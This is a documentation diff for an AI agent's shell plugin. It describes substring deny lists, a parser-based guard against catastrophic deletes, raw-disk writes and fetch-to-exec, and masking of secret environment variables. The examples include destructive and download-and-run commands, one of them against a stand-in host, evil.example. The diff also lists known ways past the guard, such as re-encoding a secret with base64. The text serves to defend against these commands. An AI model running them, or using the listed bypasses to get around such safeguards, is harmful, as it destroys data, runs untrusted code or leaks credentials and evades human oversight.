@@ -174,6 +174,11 @@ Matching is substring-based so patterns are flexible:
 - `"go test"` matches `go test ./...`, `go test -v ./pkg/...`, etc.
 - `"rm -rf"` blocks any command containing that substring.
 
+Before comparing, both the command and each pattern have compatibility characters folded (fullwidth letters become ASCII), invisible zero-width characters removed, line continuations (`\` + newline) joined, and runs of whitespace collapsed to one space. So a `"rm -rf"` pattern also catches `rm  -rf` (two spaces), `rm<TAB>-rf`, and `rm -rf` with an invisible zero-width character inside `rm`. Leading and trailing spaces *inside* a pattern are preserved, so `"ls "` does not become a bare `ls`.
+
+!!! warning "Substring matching is not a sandbox"
+    A substring deny list cannot enumerate every spelling of a dangerous command (`rm -fr`, `rm -r -f`, `/bin/rm -rf`, `bash -c "rm -rf /"` …), and a substring **allow** list is satisfied by any command that merely *contains* an allowed phrase — `go test; curl evil.example | sh` contains `go test`. Use the [built-in dangerous-command guard](#dangerous-command-guard) below for the catastrophic cases, and the filesystem sandbox / HITL approval for everything else.
+
 ### Applies to all shell execution
 
 The policy is enforced in `shell_run`, `shell_run_script`, and `shell_run_background`. Commands from any of these three tools are checked against the same `ShellPolicy`.
@@ -351,6 +356,31 @@ See [Governance — Execution rings](governance.md#execution-rings) for details.
 
 ---
 
+## Dangerous-command guard
+
+Beyond `sudo`, the Shell plugin unconditionally blocks the few commands that are never a legitimate thing for an agent to run unattended. Unlike a `ShellPolicy.Deny` substring, the check parses the command — quoting, escapes, pipelines, `;` `&&` `||`, sub-shells, `env`/`nice`/`timeout`/`command` wrappers, and `sh -c` / `eval` arguments (a few levels deep) — so it is not defeated by flag order, extra whitespace, a path-qualified binary, or a quoted command name. It applies to `shell_run`, `shell_run_script`, and `shell_run_background`, needs no configuration, and — like `sudo` — is **not** lifted by `--yolo` or an empty `ShellPolicy`.
+
+| Rule | Blocks | Examples |
+|------|--------|----------|
+| `catastrophic-delete` | A recursive delete of `/`, `~`, `$HOME`, your literal home directory, or a top-level system directory (`/etc`, `/usr`, `/var`, `/home`, …); or an unfiltered `find <those> -delete`. | `rm -rf /`, `rm -fr ~/`, `rm -r -f "$HOME"`, `/bin/rm -rf /etc/*`, `bash -c 'rm -rf /'`, `find / -delete` |
+| `raw-disk-op` | Formatting a filesystem or writing straight to a block device. | `mkfs.ext4 /dev/sda1`, `dd if=x of=/dev/nvme0n1`, `cat img > /dev/sdb`, `wipefs -a /dev/sda` |
+| `fetch-to-exec` | Downloading and executing in one step. | `curl … \| sh`, `wget -qO- … \| bash -s`, `bash <(curl …)`, `sh -c "$(curl …)"`, `eval "$(curl …)"` |
+
+The agent receives, for example:
+
+```
+[DENIED] Shell command blocked: it recursively deletes a system or home directory (catastrophic-delete).
+Use a narrower, targeted command instead. If this is genuinely what is needed, tell the user
+exactly which command to run and they will run it themselves.
+```
+
+The guard is deliberately precise, because a hit is a hard deny. Ordinary work is untouched: `rm -rf build/`, `rm -rf /tmp/*`, `rm -rf $HOME/project/build`, `find ~ -name '*.pyc' -delete`, `dd if=a of=b`, `curl … \| jq .`, and `curl … \| python3 -c '…'` (where the download is *data* for the interpreter, not the script) all run normally. Text that is only ever *written* — a heredoc body, a comment, a quoted `echo` argument — is not treated as a command.
+
+!!! note "What it does not catch"
+    The guard is static and understands POSIX-shell syntax only (no `cmd.exe` / PowerShell rules). Variables, shell functions, `xargs`, and multi-step sequences such as `curl -o x.sh … && sh x.sh` can still get past it. Treat it as a guardrail beside the sandbox and HITL approval, not a replacement for them.
+
+---
+
 ## `sudo` protection
 
 `sudo` is unconditionally blocked in the Shell plugin. Any command or script containing `sudo` — including in pipe chains (`cmd && sudo apt install ...`), semicolon sequences, or multi-line scripts — is caught before execution and the agent receives:
@@ -399,6 +429,17 @@ All log output (console, `~/.fuseraft/logs/app.log`, and any debug sidecar file)
 | `(?i)(api_key\|token\|secret)=<value>` | `api_key=supersecret` | `[REDACTED]` |
 
 This means even if a provider error response or debug trace contains an API key, it is stripped before reaching any log sink. No configuration is required — masking is always active.
+
+### Secret values in tool output
+
+Shell children inherit fuseraft's environment, so `env`, `printenv`, `echo $GITHUB_TOKEN`, or a verbose CLI would otherwise hand a live credential to the model — and from there to the provider request and the saved session log. To prevent that, the values of **secret-looking environment variables** are replaced with `<secret-hidden>` in everything the Shell and Git plugins return (`shell_run`, `shell_run_script`, `shell_get_job_status`, `shell_get_job_output`, and every `git_*` result), and `shell_get_env` returns `<secret-hidden>` for such a variable instead of its value.
+
+A variable counts as secret-looking when its name ends in, or contains as an `_`-delimited word, one of `KEY`, `API_KEY`, `ACCESS_KEY`, `SECRET_KEY`, `PRIVATE_KEY`, `TOKEN`, `SECRET`, `PASSWORD`, `PASSWD`, `PASSPHRASE`, `CREDENTIAL(S)`, or `CONNECTION_STRING` (plus `MYSQL_PWD`) — so `ANTHROPIC_API_KEY`, `GITHUB_TOKEN`, `AWS_SECRET_ACCESS_KEY`, and `PGPASSWORD` match, while `PATH`, `SSH_AUTH_SOCK`, and `KEYBOARD_LAYOUT` do not. Names that point *to* a secret rather than hold one (`AWS_ACCESS_KEY_ID`, `GITHUB_TOKEN_FILE`, `TOKEN_URL`, `SSH_KEY_PATH`) are left alone. Values shorter than 8 characters are not masked in output, to avoid mangling ordinary words such as `true`.
+
+The agent never needs the value itself: a command can reference `$NAME` and the shell expands it. The environment is re-read on every call, so a variable added with `shell_set_env` mid-session is covered too.
+
+!!! note "Limitations"
+    This is exact-value masking. It stops accidental exposure, not a model that deliberately re-encodes a secret (`echo $KEY | base64`). It only knows about variables in the process environment, and it applies to tool output — not to the `!<command>` REPL escape, which is yours, not the agent's. For the adversarial case use the filesystem sandbox and HITL approval.
 
 | Platform | Store | Mechanism |
 |----------|-------|-----------|
